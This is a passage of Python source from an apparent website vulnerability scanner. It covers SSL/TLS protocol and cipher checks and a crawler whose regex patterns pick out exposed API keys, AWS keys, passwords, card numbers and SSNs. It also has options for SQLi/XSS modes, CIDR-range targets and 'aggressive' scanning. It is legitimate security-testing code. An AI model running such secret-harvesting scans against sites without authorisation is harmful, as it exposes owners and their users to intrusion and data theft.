            },
            'SSLv3': {
                'name': 'SSLv3',
                'protocol': 'SSLv3',
                'severity': 'Critical',
                'description': 'SSLv3 is vulnerable to POODLE attack which allows decryption of secure communications',
                'recommendation': 'Disable SSLv3 on the server immediately',
                'cve': 'CVE-2014-3566'
            },
            'TLSv1.0': {
                'name': 'TLSv1.0',
                'protocol': 'TLSv1.0',
                'severity': 'High',
                'description': 'TLSv1.0 is outdated and vulnerable to BEAST attack and other weaknesses',
                'recommendation': 'Disable TLSv1.0 on the server',
                'cve': 'CVE-2011-3389'
            },
            'TLSv1.1': {
                'name': 'TLSv1.1',
                'protocol': 'TLSv1.1',
                'severity': 'Medium',
                'description': 'TLSv1.1 is outdated and should be upgraded, lacks modern cryptographic algorithms',
                'recommendation': 'Upgrade to TLSv1.2 or TLSv1.3',
                'cve': ''
            }
        }
        
        # Weak ciphers to check for
        self.weak_ciphers = [
            {
                'name': 'NULL',
                'severity': 'Critical',
                'description': 'NULL ciphers provide no encryption and allow plaintext communication',
                'keywords': ['NULL'],
                'cve': 'CVE-2015-0204'
            },
            {
                'name': 'RC4',
                'severity': 'Critical',
                'description': 'RC4 encryption is cryptographically broken and can be exploited to reveal encrypted data',
                'keywords': ['RC4', 'ARCFOUR'],
                'cve': 'CVE-2015-2808'
            },
            {
                'name': 'DES',
                'severity': 'Critical',
                'description': 'DES and Triple DES (3DES) are weak ciphers vulnerable to Sweet32 attack',
                'keywords': ['DES', '3DES', 'DES-CBC3'],
                'cve': 'CVE-2016-2183'
            },
            {
                'name': 'MD5',
                'severity': 'High',
                'description': 'MD5 hashing is cryptographically broken and vulnerable to collision attacks',
                'keywords': ['MD5', 'MD-5'],
                'cve': 'CVE-2014-8275'
            },
            {
                'name': 'Export',
                'severity': 'Critical',
                'description': 'Export-grade cipher suites are deliberately weakened and vulnerable to FREAK and Logjam attacks',
                'keywords': ['EXPORT', 'EXP', 'DHE_EXPORT', 'RSA_EXPORT'],
                'cve': 'CVE-2015-0204'
            },
            {
                'name': 'Anonymous',
                'severity': 'Critical',
                'description': 'Anonymous cipher suites provide no authentication and are vulnerable to MITM attacks',
                'keywords': ['ADH', 'AECDH', 'ANON', 'DH_anon'],
                'cve': ''
            },
            {
                'name': 'IDEA',
                'severity': 'High',
                'description': 'IDEA cipher is outdated and potentially vulnerable',
                'keywords': ['IDEA'],
                'cve': ''
            },
            {
                'name': 'SEED',
                'severity': 'Medium',
                'description': 'SEED cipher is not widely reviewed and potentially vulnerable',
                'keywords': ['SEED'],
                'cve': ''
            },
            {
                'name': 'CAMELLIA-128',
                'severity': 'Low',
                'description': 'CAMELLIA-128 provides inadequate security margin by modern standards',
                'keywords': ['CAMELLIA128', 'CAMELLIA-128'],
                'cve': ''
            }
        ]
        
        # Weak key exchanges
        self.weak_key_exchanges = [
            {
                'name': 'DHE-512',
                'severity': 'Critical',
                'description': 'DH key exchange with 512 bits is trivially breakable',
                'keywords': ['DHE_512', 'DH-512'],
                'cve': 'CVE-2015-4000'
            },
            {
                'name': 'DHE-1024',
                'severity': 'High',
                'description': 'DH key exchange with 1024 bits is potentially vulnerable to nation-state attacks',
                'keywords': ['DHE_1024', 'DH-1024', 'DHE-RSA-1024'],
                'cve': 'CVE-2015-4000'
            }
        ]
    
    def _check_certificate(self, cert):
        """
        Check SSL certificate for issues.
        
        Args:
            cert (certificate object): SSL certificate to check
            
        Returns:
            list: List of vulnerabilities found in the certificate
        """
        vulnerabilities = []
        current_date = datetime.now()
        
        # Check expiration
        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        not_before = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
        
        # Certificate expired
        if current_date > not_after:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Expired Certificate',
                'details': f"Certificate expired on {not_after.strftime('%Y-%m-%d')}",
                'severity': 'Critical',
                'recommendation': 'Renew the SSL certificate immediately'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate has expired: {not_after.strftime('%Y-%m-%d')}")
        
        # Certificate not yet valid
        if current_date < not_before:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Certificate Not Valid Yet',
                'details': f"Certificate not valid until {not_before.strftime('%Y-%m-%d')}",
                'severity': 'Critical',
                'recommendation': 'Check certificate validity dates and timezone settings'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate not yet valid: {not_before.strftime('%Y-%m-%d')}")
        
        # Certificate expiring soon (30 days)
        days_until_expiry = (not_after - current_date).days
        if 0 < days_until_expiry <= 30:
            vulnerability = {
                'type': 'SSL Certificate',
                'url': self.target_url,
                'issue': 'Certificate Expiring Soon',
                'details': f"Certificate expires in {days_until_expiry} days ({not_after.strftime('%Y-%m-%d')})",
                'severity': 'Medium',
                'recommendation': 'Plan to renew the SSL certificate soon'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning(f"SSL Certificate expiring soon: {days_until_expiry} days")
        
        # Check if certificate matches hostname
        try:
            cert_cn = cert['subject'][0][0][1]
            
            if cert_cn != self.hostname and not cert_cn.startswith('*'):
                # Try to check for Subject Alternative Names
                alt_names = []
                for i in range(len(cert['extensions'])):
                    if cert['extensions'][i]['name'] == 'subjectAltName':
                        alt_names = cert['extensions'][i]['value'].split(', ')
                        break
                
                hostname_matched = False
                for name in alt_names:
                    if name.startswith('DNS:'):
                        dns_name = name[4:]
                        if dns_name == self.hostname or (dns_name.startswith('*') and self.hostname.endswith(dns_name[1:])):
                            hostname_matched = True
                            break
                
                if not hostname_matched:
                    vulnerability = {
                        'type': 'SSL Certificate',
                        'url': self.target_url,
                        'issue': 'Hostname Mismatch',
                        'details': f"Certificate subject '{cert_cn}' doesn't match hostname '{self.hostname}'",
                        'severity': 'Medium',
                        'recommendation': 'Obtain a certificate that matches the hostname'
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"SSL Certificate hostname mismatch: {cert_cn} != {self.hostname}")
        
        except (KeyError, IndexError):
            pass
        
        # Check for weak signature algorithm
        try:
            signature_algorithm = cert['signatureAlgorithm']
            
            if 'md5' in signature_algorithm.lower() or 'sha1' in signature_algorithm.lower():
                vulnerability = {
                    'type': 'SSL Certificate',
                    'url': self.target_url,
                    'issue': 'Weak Signature Algorithm',
                    'details': f"Certificate uses weak signature algorithm: {signature_algorithm}",
                    'severity': 'High',
                    'recommendation': 'Replace with a certificate that uses SHA-256 or stronger'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"SSL Certificate uses weak algorithm: {signature_algorithm}")
        
        except KeyError:
            pass
        
        # Check for self-signed certificate
        try:
            issuer = cert['issuer']
            subject = cert['subject']
            
            if issuer == subject:
                vulnerability = {
                    'type': 'SSL Certificate',
                    'url': self.target_url,
                    'issue': 'Self-Signed Certificate',
                    'details': 'Certificate is self-signed, not issued by a trusted CA',
                    'severity': 'High',
                    'recommendation': 'Replace with a certificate from a trusted CA'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("SSL Certificate is self-signed")
        
        except KeyError:
            pass
        
        return vulnerabilities
    
    def _check_protocols(self):
        """
        Check for supported SSL/TLS protocols.
        
        Returns:
            list: List of vulnerabilities related to SSL/TLS protocols
        """
        vulnerabilities = []
        
        # Skip if not HTTPS
        if self.port != 443:
            return []
        
        # Check each vulnerable protocol
        for protocol_name, info in self.vulnerable_protocols.items():
            try:
                    
                # Create context with modern approach (no deprecated constants)
                context = ssl.create_default_context()
                # Disable all security measures to test protocols
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                # Set the protocol options to match the desired protocol
                if info['name'] == 'SSLv3':
                    context.options &= ~ssl.OP_NO_SSLv3
                elif info['name'] == 'TLSv1.0':
                    context.options &= ~ssl.OP_NO_TLSv1
                elif info['name'] == 'TLSv1.1':
                    context.options &= ~ssl.OP_NO_TLSv1_1
                
                with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                        if self.verbose and self.logger:
                            self.logger.info(f"Protocol {info['name']} is supported")
                        
                        vulnerability = {
                            'type': 'Insecure Protocol',
                            'url': self.target_url,
                            'protocol': info['name'],
                            'details': info['description'],
                            'severity': info['severity'],
                            'recommendation': info['recommendation']
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"Insecure protocol supported: {info['name']}")
            
            except (ssl.SSLError, socket.error, OSError):
                # Protocol not supported (good) or error connecting
                if self.verbose and self.logger:
                    self.logger.info(f"Protocol {info['name']} is not supported")
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error checking protocol {info['name']}: {str(e)}")
        
        return vulnerabilities
    
    def _check_cipher_suites(self):
        """
        Check for weak cipher suites.
        
        Returns:
            list: List of vulnerabilities related to weak cipher suites
        """
        vulnerabilities = []
        
        # Skip if not HTTPS
        if self.port != 443:
            return []
        
        try:
            # Use OpenSSL to get supported ciphers
            with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                    # Get cipher info
                    cipher = ssl_sock.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        
                        # Check if the current cipher is weak
                        for weak_cipher in self.weak_ciphers:
                            if any(keyword in cipher_name for keyword in weak_cipher['keywords']):
                                vulnerability = {
                                    'type': 'Weak Cipher',
                                    'url': self.target_url,
                                    'cipher': cipher_name,
                                    'details': weak_cipher['description'],
                                    'severity': weak_cipher['severity'],
                                    'recommendation': f"Disable {weak_cipher['name']} cipher suites"
                                }
                                vulnerabilities.append(vulnerability)
                                
                                if self.logger:
                                    self.logger.warning(f"Weak cipher supported: {cipher_name}")
                                
                                break
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error checking cipher suites: {str(e)}")
        
        return vulnerabilities
    
    def scan(self):
        """
        Start the SSL/TLS security scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SSL/TLS scan on {self.target_url}")
        
        # Skip if HTTP (non-SSL)
        parsed_url = urlparse(self.target_url)
        if parsed_url.scheme != 'https':
            if self.verbose and self.logger:
                self.logger.info(f"Skipping SSL/TLS scan for non-HTTPS URL: {self.target_url}")
            
            # Add a vulnerability for not using HTTPS
            vulnerability = {
                'type': 'Insecure Protocol',
                'url': self.target_url,
                'protocol': 'HTTP',
                'details': 'Site uses HTTP instead of HTTPS',
                'severity': 'High',
                'recommendation': 'Implement HTTPS with a valid SSL certificate'
            }
            vulnerabilities.append(vulnerability)
            
            if self.logger:
                self.logger.warning("Site uses insecure HTTP protocol")
            
            return vulnerabilities
        
        try:
            # Check SSL Certificate
            try:
                with socket.create_connection((self.hostname, self.port), self.timeout) as sock:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssl_sock:
                        # Get certificate in dictionary form
                        cert_dict = ssl_sock.getpeercert()
                        
                        # Check the certificate with our built-in methods
                        if cert_dict:
                            cert_vulnerabilities = self._check_certificate(cert_dict)
                            vulnerabilities.extend(cert_vulnerabilities)
                        else:
                            if self.logger:
                                self.logger.warning("Could not get certificate details")
            
            except (ssl.SSLError, socket.error) as e:
                if self.logger:
                    self.logger.error(f"Error checking SSL certificate: {str(e)}")
            
            # Check SSL/TLS protocols
            protocol_vulnerabilities = self._check_protocols()
            vulnerabilities.extend(protocol_vulnerabilities)
            
            # Check cipher suites
            cipher_vulnerabilities = self._check_cipher_suites()
            vulnerabilities.extend(cipher_vulnerabilities)
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during SSL/TLS scan: {str(e)}")
        
        return vulnerabilities

###########################################
# INFORMATION DISCLOSURE SCANNER
###########################################

class InfoDisclosureScanner:
    """Scanner for detecting sensitive information disclosure."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Information Disclosure scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Regex patterns for sensitive information
        self.patterns = {
            # Developer comments
            'HTML Comments': {
                'regex': r'<!--(?!\[if).*?-->',
                'severity': 'Low'
            },
            
            # Email addresses
            'Email Address': {
                'regex': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',
                'severity': 'Medium'
            },
            
            # API keys and tokens (generic patterns)
            'API Key': {
                'regex': r'\b(?:api[_-]?key|apikey|api[_-]?token|access[_-]?token)["\']?\s*[=:]\s*["\']([\w\-]{16,})["\'"]',
                'severity': 'Critical'
            },
            
            # AWS Access Keys
            'AWS Access Key': {
                'regex': r'\b(?:AKIA[0-9A-Z]{16})\b',
                'severity': 'Critical'
            },
            
            # AWS Secret Keys
            'AWS Secret Key': {
                'regex': r'\b(?:[0-9a-zA-Z/+]{40})\b',
                'severity': 'Critical'
            },
            
            # Connection strings
            'Connection String': {
                'regex': r'(?:connection[_-]?string|conn[_-]?str)["\']?\s*[=:]\s*["\'](.*?)["\']',
                'severity': 'Critical'
            },
            
            # Database connection details
            'Database Details': {
                'regex': r'(?:host|server|database|dbname|db_name|user|username|password|passwd|pwd)["\']?\s*[=:]\s*["\'](.*?)["\']',
                'severity': 'High'
            },
            
            # Credit card numbers
            'Credit Card': {
                'regex': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b',
                'severity': 'Critical'
            },
            
            # Social security numbers (US)
            'Social Security Number': {
                'regex': r'\b\d{3}-\d{2}-\d{4}\b',
                'severity': 'Critical'
            },
            
            # IP addresses (private/internal)
            'Internal IP': {
                'regex': r'\b(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3}|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
                'severity': 'Medium'
            },
            
            # File system paths
            'File Path': {
                'regex': r'\b(?:/[a-zA-Z0-9_.-]+)+|[A-Za-z]:\\\\[A-Za-z0-9_.-\\\\]+',
                'severity': 'Medium'
            },
            
            # Stack traces and errors
            'Stack Trace': {
                'regex': r'(?:stack trace|stacktrace|call stack):|at\s+[\w\.$]+\([^)]*\)|Exception\s+in\s+|throw\s+new\s+|Microsoft SQL Server\s+error|mysqli_error|mysql_error|pg_query|sqlite3_exec|ORA-\d{5}|error\s+occurred|SQL syntax|SQL statement|Warning: \w+\(\)',
                'severity': 'High'
            },
            
            # JWT Tokens
            'JWT Token': {
                'regex': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
                'severity': 'High'
            },
            
            # Version information
            'Version Information': {
                'regex': r'(?:version|v)[\s="\']+([0-9]+(?:\.[0-9]+)+)',
                'severity': 'Low'
            },
            
            # Debug flags or statements
            'Debug Information': {
                'regex': r'(?:DEBUG|TRACE|TODO|FIXME)(?:\s+|:)',
                'severity': 'Medium'
            }
        }
        
        # Compile all regex patterns
        for key, info in self.patterns.items():
            # Store original regex string first
            info['regex_str'] = info['regex']
            # Then compile it and store the pattern directly for use
            try:
                pattern = re.compile(info['regex'], re.IGNORECASE | re.MULTILINE)
                info['compiled'] = pattern
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error compiling regex pattern '{info['regex']}': {str(e)}")
                # Create a fallback pattern that won't match anything
                info['compiled'] = re.compile(r'a^', re.IGNORECASE | re.MULTILINE)
    
    def _extract_page_content(self, url):
        """
        Extract the content of a webpage using trafilatura if available,
        otherwise just use the raw HTML. Handles various errors and includes
        retry mechanism for more reliable content extraction.
        
        Args:
            url (str): The URL to extract content from
            
        Returns:
            tuple: (raw_html, extracted_text) or (None, None) if error
        """
        retry_count = 2
        
        for attempt in range(retry_count + 1):
            try:
                # Use stream=True to avoid downloading entire content before checking status code
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    stream=True,
                    verify=True
                )
                
                # Check status code first before downloading content
                if response.status_code != 200:
                    if self.logger and self.verbose:
                        self.logger.debug(f"Got status code {response.status_code} from {url}")
                    response.close()  # Close connection to free resources
                    return None, None
                
                # Only read response content if status code is good
                raw_html = response.text
                
                # Try to extract main content using trafilatura if available
                extracted_text = None
                if TRAFILATURA_AVAILABLE:
                    try:
                        # Make sure to access the global trafilatura module
                        import trafilatura as traf
                        extracted_text = traf.extract(raw_html)
                        
                        # If trafilatura failed to extract anything useful
                        if not extracted_text:
                            # Try with additional options
                            extracted_text = traf.extract(
                                raw_html,
                                include_comments=False,
                                include_tables=True,
                                no_fallback=False
                            )
                    except Exception as traf_error:
                        # Log error but continue with raw HTML
                        if self.logger and self.verbose:
                            self.logger.debug(f"Trafilatura error: {str(traf_error)}")
                
                # Extract title or meta information when possible
                try:
                    soup = BeautifulSoup(raw_html, 'html.parser')
                    page_title = soup.title.string if soup.title else None
                    if self.logger and self.verbose and page_title:
                        self.logger.debug(f"Page title: {page_title}")
                except Exception:
                    pass
                    
                return raw_html, extracted_text
                
            except requests.exceptions.SSLError as e:
                # SSL errors might require retry without verification
                if self.logger and attempt == retry_count:
                    self.logger.error(f"SSL error extracting content from {url}: {str(e)}")
                if attempt < retry_count:
                    try:
                        # Retry without SSL verification
                        response = requests.get(
                            url, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            verify=False,  # Skip SSL verification on retry
                            stream=True
                        )
                        raw_html = response.text
                        response.close()
                        return raw_html, None  # Return without trafilatura extraction
                    except Exception:
                        pass
                    
            except requests.exceptions.ConnectionError:
                if self.logger and attempt == retry_count:
                    self.logger.error(f"Connection error for {url}")
                
            except requests.exceptions.Timeout:
                if self.logger and attempt == retry_count:
                    self.logger.error(f"Request timeout for {url}")
                
            except Exception as e:
                if self.logger and attempt == retry_count:
                    self.logger.error(f"Error extracting content from {url}: {str(e)}")
            
            # Wait between retries
            if attempt < retry_count:
                time.sleep(1)
                    
        return None, None
    
    def _extract_links(self, url, html):
        """
        Extract all links from the HTML content.
        
        Args:
            url (str): The base URL
            html (str): HTML content
            
        Returns:
            list: List of absolute URLs found
        """
        if not html:
            return []
        
        links = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Extract links from anchor tags
            for a_tag in soup.find_all('a', href=True):
                link = urljoin(url, a_tag['href'])
                # Only include links on the same domain
                parsed_url = urlparse(url)
                parsed_link = urlparse(link)
                
                if parsed_url.netloc == parsed_link.netloc and link not in links:
                    links.append(link)
            
            # Limit number of links based on depth
            max_links = min(len(links), 5 * self.depth)
            return links[:max_links]
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting links from {url}: {str(e)}")
            return []
    
    def _scan_content(self, url, html, text):
        """
        Scan page content for sensitive information.
        
        Args:
            url (str): The URL being scanned
            html (str): Raw HTML content
            text (str): Extracted text content
            
        Returns:
            list: List of findings
        """
        findings = []
        
        if not html:
            return findings
        
        # Use HTML for all scans
        content_to_scan = html
        
        # Check each pattern
        for pattern_name, pattern_info in self.patterns.items():
            try:
                # Use compiled regex pattern to find matches
                # Check if this pattern has already been compiled, otherwise compile it now
                if 'compiled' not in pattern_info:
                    # Compile the regex pattern
                    pattern_info['compiled'] = re.compile(pattern_info['regex_str'], re.IGNORECASE | re.MULTILINE)
                
                # Use the compiled pattern
                compiled_regex = pattern_info['compiled']
                matches = compiled_regex.findall(content_to_scan)
                
                # Filter matches to remove false positives
                filtered_matches = []
                
                for match in matches:
                    # Convert match to string if it's a tuple
                    match_str = match if isinstance(match, str) else match[0]
                    
                    # Skip common false positives
                    skip_match = False
                    
                    if pattern_name == 'Email Address':
                        if 'example.com' in match_str or 'user@domain' in match_str:
                            skip_match = True
                    
                    elif pattern_name == 'Internal IP':
                        if match_str in ['127.0.0.1']:
                            skip_match = True
                    
                    elif pattern_name == 'File Path':
                        # Skip common web paths like /js/, /css/, /images/
                        if re.match(r'^(/js/|/css/|/img/|/images/|/static/|/assets/)', match_str):
                            skip_match = True
                    
                    # Add to filtered matches if not skipped
                    if not skip_match:
                        filtered_matches.append(match_str)
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error analyzing pattern {pattern_name}: {str(e)}")
                continue
            
            # If we have matches, add a finding
            if filtered_matches:
                # Limit the number of matches shown
                samples = filtered_matches[:3]
                samples_str = ', '.join(samples)
                
                if len(filtered_matches) > 3:
                    samples_str += f" and {len(filtered_matches) - 3} more"
                
                severity = pattern_info['severity']
                category = pattern_name
                
                finding = {
                    'type': 'Information Disclosure',
                    'url': url,
                    'category': category,
                    'matches': samples,
                    'details': f"Found {category}: {samples_str}",
                    'severity': severity,
                    'recommendation': f"Remove {category.lower()} from the page source"
                }
                findings.append(finding)
                
                if self.logger:
                    self.logger.warning(f"Information disclosure found: {category} on {url}")
        
        return findings
    
    def _determine_severity(self, category):
        """
        Determine the severity level based on the finding category.
        
        Args:
            category (str): The finding category
            
        Returns:
            str: Severity level (Critical, High, Medium, Low, Info)
        """
        critical_categories = ['API Key', 'AWS Access Key', 'AWS Secret Key', 'Connection String', 'Credit Card', 'Social Security Number']
        high_categories = ['Database Details', 'Stack Trace', 'JWT Token']
        medium_categories = ['Email Address', 'Internal IP', 'File Path', 'Debug Information']
        
        if category in critical_categories:
            return 'Critical'
        elif category in high_categories:
            return 'High'
        elif category in medium_categories:
            return 'Medium'
        else:
            return 'Low'
    
    def scan(self):
        """
        Start the information disclosure scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting information disclosure scan on {self.target_url}")
        
        # Scan the main page
        html, text = self._extract_page_content(self.target_url)
        if html:
            findings = self._scan_content(self.target_url, html, text)
            vulnerabilities.extend(findings)
            
            # Extract and scan linked pages if depth allows
            if self.depth > 1:
                links = self._extract_links(self.target_url, html)
                
                if self.verbose and self.logger:
                    self.logger.info(f"Found {len(links)} links to scan")
                
                # Limit the number of links to scan based on depth
                max_links = min(len(links), 5 * self.depth)
                links_to_scan = links[:max_links]
                
                # Scan each link
                for link in links_to_scan:
                    if self.verbose and self.logger:
                        self.logger.info(f"Scanning link: {link}")
                    
                    link_html, link_text = self._extract_page_content(link)
                    if link_html:
                        link_findings = self._scan_content(link, link_html, link_text)
                        vulnerabilities.extend(link_findings)
        
        if self.logger:
            self.logger.info(f"Completed information disclosure scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# MAIN FUNCTION
###########################################

def print_banner():
    """Display the tool banner."""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  {Fore.WHITE}██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗{Fore.CYAN}  ║
║  {Fore.WHITE}██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║{Fore.CYAN}  ║
║  {Fore.WHITE}██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║{Fore.CYAN}  ║
║  {Fore.WHITE}██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║{Fore.CYAN}  ║
║  {Fore.WHITE}╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║{Fore.CYAN}  ║
║  {Fore.WHITE} ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Fore.CYAN}  ║
║                                                                  ║
║  {Fore.GREEN}Advanced Website Vulnerability Scanner                        {Fore.CYAN}║
║  {Fore.YELLOW}Version {VERSION}                                                {Fore.CYAN}║
║  {Fore.MAGENTA}Developed by AMKUSH                                           {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════╝

{Style.RESET_ALL}{Fore.CYAN}➤ {Fore.YELLOW}Real-world vulnerability detection with aggressive techniques
{Fore.CYAN}➤ {Fore.GREEN}Multi-threaded scanning engine for efficient analysis
{Fore.CYAN}➤ {Fore.BLUE}Comprehensive reporting with risk-based prioritization
{Fore.CYAN}➤ {Fore.MAGENTA}Target scanning via URL, IP, or CIDR range
{Fore.CYAN}➤ {Fore.RED}Multiple vulnerability detection modules{Style.RESET_ALL}
    """
    print(banner)

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description=f'Advanced Website Vulnerability Scanner v{VERSION}',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"Examples:\n"
               f"  Basic scan: {sys.argv[0]} https://example.com\n"
               f"  Full scan with verbose output: {sys.argv[0]} https://example.com -v\n"
               f"  Custom scan: {sys.argv[0]} https://example.com --scan-type sqli,xss,ssl\n"
               f"  Multiple targets: {sys.argv[0]} --target-list targets.txt -v --scan-type headers,ssl\n"
               f"  Interactive mode: {sys.argv[0]} -i\n"
    )
    
    # Target specification - can be URL, IP, CIDR range, or left empty for interactive mode
    parser.add_argument('url', nargs='?', 
                        help='Target URL to scan (e.g., https://example.com) or IP/CIDR range')
    
    # Input/Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('-o', '--output', 
                        help='Output file for the scan report (default: webscan_report.txt)',
                        default='webscan_report.txt')
    
    output_group.add_argument('--json', 
                        help='Export results in JSON format',
                        action='store_true')
    
    output_group.add_argument('--log-file', 
                        help='Log file path (default: webscan.log)',
                        default='webscan.log')
    
    output_group.add_argument('--no-color', 
                        help='Disable colored output',
                        action='store_true')
    
    output_group.add_argument('-q', '--quiet', 
                        help='Quiet mode - display only critical information',
                        action='store_true')
    
    # Scan configuration options
    scan_group = parser.add_argument_group('Scan Configuration')
    scan_group.add_argument('-t', '--threads', 
                        help='Number of threads to use (default: 5)',
                        type=int, default=5)
    
    scan_group.add_argument('-d', '--depth', 
                        help='Scan depth - number of levels to crawl (default: 2)',
                        type=int, default=2)
    
    scan_group.add_argument('-c', '--crawl', 
                        help='Crawl the website for links before scanning',
                        action='store_true')
    
    scan_group.add_argument('--timeout', 
                        help='Request timeout in seconds (default: 10)',
                        type=int, default=10)
    
    scan_group.add_argument('--user-agent', 
                        help='Custom User-Agent string',
                        default=f'WebScan/{VERSION}')
    
    scan_group.add_argument('--scan-type', 
                        help='''Specify scan types (comma-separated):
all: All scan types (default)
sqli: SQL Injection
xss: Cross-Site Scripting
port: Open Port Scanning
dir: Directory Traversal
files: Sensitive Files
headers: HTTP Headers
ssl: SSL/TLS
info: Information Disclosure''',
                        default='all')
    
    scan_group.add_argument('--exclude', 
                        help='Exclude specific scan types (comma-separated)', 
                        default='')
    
    scan_group.add_argument('--max-urls', 
                        help='Maximum number of URLs to scan (default: 1000)',
                        type=int, default=1000)
    
    # Advanced options
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument('-i', '--interactive', 
                        help='Run in interactive mode',
                        action='store_true')
    
    advanced_group.add_argument('--target-list', 
                        help='File containing list of targets to scan (one per line)')
    
    advanced_group.add_argument('--cookies', 
                        help='Cookies to include with HTTP requests (format: "name1=value1; name2=value2")')
    
    advanced_group.add_argument('--headers', 
                        help='Custom HTTP headers to add to requests (format: "Header1: value1; Header2: value2")')
    
    advanced_group.add_argument('--resume', 
                        help='Resume from a previous scan state file')
    
    advanced_group.add_argument('--risk-threshold', 
                        help='Risk score threshold for reporting vulnerabilities (1-10, default: 1)',
                        type=float, default=1.0)
    
    # Feature flags
    feature_group = parser.add_argument_group('Feature Options')
    feature_group.add_argument('-v', '--verbose', 
                        help='Enable verbose output',
                        action='store_true')
    
    feature_group.add_argument('--show-progress', 
                        help='Show progress bar during scanning',
                        action='store_true')
    
    feature_group.add_argument('--save-state', 
                        help='Save scan state periodically for resume capability',
                        action='store_true')
    
    feature_group.add_argument('--aggressive', 
                        help='Enable more aggressive scanning techniques (potentially detectable)',
                        action='store_true')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Adjust file names if JSON output is requested
    if args.json and not args.output.lower().endswith('.json'):
        args.output = os.path.splitext(args.output)[0] + '.json'
    
    # Interactive mode doesn't require a URL
    if not args.url and not args.interactive and not args.target_list and not args.resume:
        parser.error("URL is required unless --interactive, --target-list, or --resume is specified")
    
    # Validate URL if provided
    if args.url and not args.url.startswith(('http://', 'https://')) and '/' not in args.url:
        # Not CIDR notation and not a URL with scheme, might be a simple hostname
        try:
            ipaddress.ip_address(args.url)  # Check if it's a valid IP
        except ValueError:
            # Not an IP, assume it's a hostname without scheme
            args.url = f"http://{args.url}"
    
    # Process scan types
    valid_types = ['sqli', 'xss', 'port', 'dir', 'files', 'headers', 'ssl', 'info']
    
    if args.scan_type == 'all':
        args.scan_types = valid_types.copy()
    else:
        args.scan_types = [s.strip() for s in args.scan_type.split(',')]
        for scan_type in args.scan_types:
            if scan_type not in valid_types:
                parser.error(f"Invalid scan type: {scan_type}")
    
    # Process excluded scan types
    if args.exclude:
        excluded_types = [s.strip() for s in args.exclude.split(',')]
        for scan_type in excluded_types:
            if scan_type in args.scan_types:
                args.scan_types.remove(scan_type)
    
